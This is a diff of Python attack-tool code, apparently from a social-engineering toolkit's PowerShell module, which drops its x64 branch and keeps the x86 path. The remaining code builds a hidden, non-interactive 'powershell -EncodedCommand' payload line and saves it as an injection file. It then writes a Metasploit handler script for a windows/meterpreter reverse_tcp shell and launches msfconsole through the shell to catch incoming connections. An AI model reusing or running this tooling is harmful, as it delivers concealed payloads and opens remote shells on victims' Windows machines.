@@ -33,18 +33,13 @@ if powershell_menu_choice != "99":
             os.makedirs(setdir + "/reports/powershell")
 
         # here we format everything for us
-        x64 = file(setdir + "/x64.powershell", "r")
-        x64 = x64.read()
-        x64 = "powershell -noprofile -windowstyle hidden -noninteractive -EncodedCommand " + x64
         x86 = file(setdir + "/x86.powershell", "r")
         x86 = x86.read()
         x86 = "powershell -noprofile -windowstyle hidden -noninteractive -EncodedCommand " + x86
         print_status("If you want the powershell commands and attack, they are exported to %s/reports/powershell/" % (setdir))
-        filewrite = file(setdir + "/reports/powershell/x64_powershell_injection.txt", "w")
-        filewrite.write(x64)
-        filewrite.close()
         filewrite = file(setdir + "/reports/powershell/x86_powershell_injection.txt", "w")
         filewrite.write(x86)
+        filewrite.close()
 
         choice = yesno_prompt("0","Do you want to start the listener now [yes/no]: ")
         if choice == 'NO':
@@ -52,15 +47,9 @@ if powershell_menu_choice != "99":
 
         # if we want to start the listener
         if choice == 'YES':
-            victim = raw_input(setprompt(["29"], "Select x86 or x64 victim machine [default: x64]"))
-            if victim == "x86":
-                filewrite = file(setdir + "/reports/powershell/powershell.rc", "w")
-                filewrite.write("use multi/handler\nset payload windows/meterpreter/reverse_tcp\nset lport %s\nset LHOST 0.0.0.0\nexploit -j" % (port))
-                filewrite.close()
-            else:
-                filewrite = file(setdir + "/reports/powershell/powershell.rc", "w")
-                filewrite.write("use multi/handler\nset payload windows/x64/meterpreter/reverse_tcp\nset lport %s\nset LHOST 0.0.0.0\nexploit -j" % (port))
-                filewrite.close()
+            filewrite = file(setdir + "/reports/powershell/powershell.rc", "w")
+            filewrite.write("use multi/handler\nset payload windows/meterpreter/reverse_tcp\nset lport %s\nset LHOST 0.0.0.0\nexploit -j" % (port))
+            filewrite.close()
             msf_path = meta_path()
             subprocess.Popen("ruby %s/msfconsole -L -n -r %s/reports/powershell/powershell.rc" % (msf_path, setdir), shell=True).wait()
 
